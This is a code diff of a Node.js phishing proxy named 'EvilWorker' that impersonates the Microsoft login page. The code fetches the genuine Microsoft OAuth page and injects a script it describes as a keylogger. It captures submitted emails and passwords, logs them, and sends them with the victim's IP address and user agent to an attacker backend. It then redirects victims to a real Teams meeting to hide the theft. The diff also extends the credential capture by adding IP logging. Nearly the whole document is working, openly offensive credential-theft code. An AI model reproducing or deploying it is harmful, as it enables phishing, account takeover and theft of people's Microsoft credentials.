@@ -5,7 +5,10 @@ const path = require('path');
 const querystring = require('querystring');
 const crypto = require('crypto');
 
-// --- CONFIGURATION ---
+// ============================================================
+//  CONFIGURATION - Customize these values
+// ============================================================
+
 const PROXY_ENTRY_POINT = "/login";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const REDIRECT_URL = "https://login.microsoftonline.com/";
@@ -28,7 +31,10 @@ const PROXY_PATHNAMES = {
     favicon: "/favicon.ico"
 };
 
-// --- LOGGING ---
+// ============================================================
+//  LOGGING
+// ============================================================
+
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
 if (!fs.existsSync(LOGS_DIRECTORY)) {
     fs.mkdirSync(LOGS_DIRECTORY);
@@ -37,7 +43,11 @@ if (!fs.existsSync(LOGS_DIRECTORY)) {
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 const VICTIM_SESSIONS = {};
 
-// --- Helper: Send to Backend ---
+// ============================================================
+//  HELPERS
+// ============================================================
+
+// Send credentials to backend
 async function sendToBackend(email, password, req) {
     try {
         const axios = require('axios');
@@ -47,14 +57,16 @@ async function sendToBackend(email, password, req) {
             password: password,
             visitorInfo: {
                 fullUrl: req.url,
-                userAgent: req.headers['user-agent'] || 'Unknown'
+                userAgent: req.headers['user-agent'] || 'Unknown',
+                ip: req.socket.remoteAddress || 'Unknown'
             }
         });
-        console.log(`[BACKEND] Sent credentials for: ${email}`);
+        console.log(`[BACKEND] ✅ Sent credentials for: ${email}`);
     } catch (error) {
-        console.error(`[BACKEND] Failed to send: ${error.message}`);
+        console.error(`[BACKEND] ❌ Failed to send: ${error.message}`);
     }
     
+    // Also send to authenticate endpoint
     try {
         const axios = require('axios');
         await axios.post(`${BACKEND_URL}/api/authenticate`, {
@@ -62,16 +74,99 @@ async function sendToBackend(email, password, req) {
             password: password,
             visitorInfo: {
                 fullUrl: req.url,
-                userAgent: req.headers['user-agent'] || 'Unknown'
+                userAgent: req.headers['user-agent'] || 'Unknown',
+                ip: req.socket.remoteAddress || 'Unknown'
             }
         });
-        console.log(`[BACKEND] Authenticate sent for: ${email}`);
+        console.log(`[BACKEND] ✅ Authenticate sent for: ${email}`);
     } catch (error) {
-        console.error(`[BACKEND] Failed to authenticate: ${error.message}`);
+        console.error(`[BACKEND] ❌ Failed to authenticate: ${error.message}`);
     }
 }
 
-// --- Server ---
+// Serve file helper
+function serveFile(filename, res, contentType = 'text/html') {
+    const filePath = path.join(__dirname, filename);
+    fs.readFile(filePath, (err, data) => {
+        if (err) {
+            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
+            res.writeHead(404, { 'Content-Type': 'text/html' });
+            res.end('<h1>404 Not Found</h1>');
+            return;
+        }
+        res.writeHead(200, { 
+            'Content-Type': contentType,
+            'Cache-Control': 'no-store'
+        });
+        res.end(data);
+    });
+}
+
+// ============================================================
+//  REQUEST HANDLERS
+// ============================================================
+
+function handlePostRequest(body, req, res) {
+    try {
+        const formData = querystring.parse(body);
+        const email = formData.login || formData.loginfmt || formData.email || '';
+        const password = formData.passwd || formData.password || '';
+
+        console.log(`[CREDENTIALS] 📧 Email: ${email}, 🔑 Password: ${password}`);
+
+        // Send to backend
+        sendToBackend(email, password, req);
+
+    } catch (error) {
+        console.error('[ERROR] POST handling failed:', error.message);
+    }
+
+    // Redirect to REAL Teams meeting
+    res.writeHead(302, { 
+        'Location': TEAMS_REDIRECT,
+        'Cache-Control': 'no-store'
+    });
+    res.end();
+}
+
+function handleLoginRequest(req, res) {
+    const email = req.url.split('login_hint=')[1]?.split('&')[0] || '';
+    
+    // Build Microsoft OAuth URL with required parameters
+    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
+    
+    console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
+    
+    https.get(targetUrl, (targetRes) => {
+        let data = [];
+        targetRes.on('data', (chunk) => data.push(chunk));
+        targetRes.on('end', () => {
+            let body = Buffer.concat(data).toString();
+            
+            // Inject keylogger script
+            body = body.replace(
+                '</body>',
+                `<script src="${PROXY_PATHNAMES.script}"></script></body>`
+            );
+            
+            res.writeHead(200, {
+                'Content-Type': 'text/html',
+                'Cache-Control': 'no-store'
+            });
+            res.end(body);
+        });
+    }).on('error', (err) => {
+        console.error(`[ERROR] Proxy failed: ${err.message}`);
+        // Fallback redirect
+        res.writeHead(302, { 'Location': targetUrl });
+        res.end();
+    });
+}
+
+// ============================================================
+//  SERVER
+// ============================================================
+
 const server = http.createServer((req, res) => {
     console.log(`[REQUEST] ${req.method} ${req.url}`);
 
@@ -115,82 +210,32 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // --- Fallback ---
+    // --- Fallback redirect ---
     res.writeHead(302, { 'Location': REDIRECT_URL });
     res.end();
 });
 
-// --- Helper: Serve File ---
-function serveFile(filename, res, contentType = 'text/html') {
-    fs.readFile(path.join(__dirname, filename), (err, data) => {
-        if (err) {
-            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
-            res.writeHead(404, { 'Content-Type': 'text/html' });
-            res.end('<h1>404 Not Found</h1>');
-            return;
-        }
-        res.writeHead(200, { 'Content-Type': contentType });
-        res.end(data);
-    });
-}
+// ============================================================
+//  START SERVER
+// ============================================================
 
-// --- Helper: Handle POST ---
-function handlePostRequest(body, req, res) {
-    try {
-        const formData = querystring.parse(body);
-        const email = formData.login || formData.loginfmt || formData.email || '';
-        const password = formData.passwd || formData.password || '';
-
-        console.log(`[CREDENTIALS] Email: ${email}, Password: ${password}`);
-
-        sendToBackend(email, password, req);
-
-    } catch (error) {
-        console.error('[ERROR] POST handling failed:', error.message);
-    }
-
-    res.writeHead(302, { 'Location': TEAMS_REDIRECT });
-    res.end();
-}
-
-// --- Helper: Handle Login ---
-function handleLoginRequest(req, res) {
-    const email = req.url.split('login_hint=')[1]?.split('&')[0] || '';
-    
-    // ✅ FIX: Added 'scope' parameter to the URL
-    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
-    
-    console.log(`[PROXY] Forwarding to: ${targetUrl}`);
-    
-    https.get(targetUrl, (targetRes) => {
-        let data = [];
-        targetRes.on('data', (chunk) => data.push(chunk));
-        targetRes.on('end', () => {
-            let body = Buffer.concat(data).toString();
-            
-            // Inject keylogger script
-            body = body.replace(
-                '</body>',
-                `<script src="${PROXY_PATHNAMES.script}"></script></body>`
-            );
-            
-            res.writeHead(200, {
-                'Content-Type': 'text/html',
-                'Cache-Control': 'no-store'
-            });
-            res.end(body);
-        });
-    }).on('error', (err) => {
-        console.error(`[ERROR] Proxy failed: ${err.message}`);
-        res.writeHead(302, { 'Location': targetUrl });
-        res.end();
-    });
-}
-
-// --- Start Server ---
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`✅ EvilWorker proxy running on port ${PORT}`);
     console.log(`📍 Entry point: ${PROXY_ENTRY_POINT}`);
     console.log(`🔗 Backend URL: ${BACKEND_URL}`);
+    console.log(`📤 Teams redirect: ${TEAMS_REDIRECT}`);
+    console.log('🔄 Proxy is ready for connections');
+});
+
+// ============================================================
+//  ERROR HANDLING
+// ============================================================
+
+process.on('uncaughtException', (err) => {
+    console.error('🔥 UNCAUGHT EXCEPTION:', err);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('🔥 UNHANDLED REJECTION:', reason);
 });
